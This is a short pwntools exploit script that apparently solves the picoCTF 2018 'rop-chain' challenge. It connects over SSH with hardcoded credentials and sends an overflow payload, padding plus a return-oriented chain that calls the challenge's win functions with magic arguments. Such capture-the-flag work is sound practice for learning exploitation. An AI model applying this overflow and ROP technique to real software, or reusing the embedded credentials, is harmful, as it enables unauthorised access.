#coding=utf-8
from pwn import *

s = ssh(host = '2018shell3.picoctf.com', user = 'Zeze', password = 'casper1014')
s.set_working_directory('/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9')
p = s.process('./rop')
#p = process('./rop')
p.recvuntil('Enter your input> ')

gets = 0x8048731
stack = 0xffffd530
ret = 0xffffd54c

pop = 0x080485d6
win_function1 = 0x80485cb
win_function2 = 0x80485d8
flag = 0x804862b

p.sendline('a' * (ret - stack) + flat(win_function1, win_function2, pop, 0xBAAAAAAD, flag, pop, 0xDEADBAAD))
res = p.recvall(1)
print res
